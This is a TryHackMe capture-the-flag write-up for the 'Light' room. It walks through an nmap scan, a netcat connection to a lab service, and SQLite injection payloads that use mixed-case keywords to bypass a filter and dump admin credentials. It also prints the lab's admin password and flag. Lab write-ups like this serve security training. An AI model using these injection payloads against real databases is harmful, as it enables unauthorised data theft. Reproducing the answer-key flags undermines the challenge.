## Light - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/lightroom)

<i>Welcome!</i>

<i>I am working on a database application called Light! Would you like to try it out?</i>
<i>If so, the application is running on port 1337. You can connect to it using nc MACHINE_IP 1337</i>
<i>You can use the username smokey in order to get started.</i>

<i>**Note: Please allow the service 2 - 3 minutes to fully start before connecting to it**<i>.

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: SQL Injection <br>

**Tools Used**: Nmap<br>

**Author**: <br>
mauzware aka mauzinho <br>
[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

IP: 10.10.237.33<br>
Username: `smokey`<br>
Password: `vYQ5ngPpw8AdUmL` ; you get this password when you get netcat connection<br>

- Nmap Scan

  ```
  nmap -A -p- 10.10.237.33
  ```

- Found:

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)<br>
1337/tcp open  waste?

## ⚙️ Exploitation 

  ```
  nc 10.10.237.33 1337
  ```

After connecting, type smokey to get his password `vYQ5ngPpw8AdUmL`

- Now we start with the payloads:
  First we check if SQLI is actually possible.

  ```
  smokey'
  smokey' UNION SELECT 1 -- -
  smokey' UNION SELECT 1 #
  ```

- I got various different responses with different queries and I concluded that filtering is present. Now, it took me a bit to find the specific filter bypass since I wanted to find which DBMS is used.<br>
  This is what I used:

  ```
  smokey' UnIon SeLect @@version '
  smokey' UnIon SeLect version() '
  smokey' UnIon SeLect sqlite_version() '
  ```

  Only got positive response with `smokey' UnIon SeLect sqlite_version() '` so its a SQLite database!

  Now extracting the values from DBMS:

- This one extracts table names, it gave me `admintable`:

  ```
  smokey' UnIon SeLect tbl_name FROM sqlite_master WHERE type='table
  ```

- This one extracts schema of table in SQLite:

  ```
  smokey' UnIon SeLect sql FROM sqlite_master WHERE name = 'admintable
  ```

- Now for final push, lets get both usernames and passwords from admintable:

  ```
  smokey' UnIon SeLect group_concat(username || ":" || password) FROM admintable '
  ```

**Result of last query**: `Password:TryHackMeAdmin:mamZtAuMlrsEy5bp6q17,flag:THM{SQLit3_InJ3cTion_is_SimplE_nO?}`

- **Theres various different resources/documentation to help you out with this challenge, I prefer PayloadsAllTheThings**.

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## 🏁 Flags

- **What is the admin username?** : `TryHackMeAdmin`
- **What is the password to the username mentioned in question 1?** : `mamZtAuMlrsEy5bp6q17`
- **What is the flag?** : `THM{SQLit3_InJ3cTion_is_SimplE_nO?}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?<br>
  `It took me a bit to realise that netcat connection gives you immediate access to the database...`
  
- What did I learn?<br>
  `Just kept sharpening SQLI skills`
  
- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!
  
- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
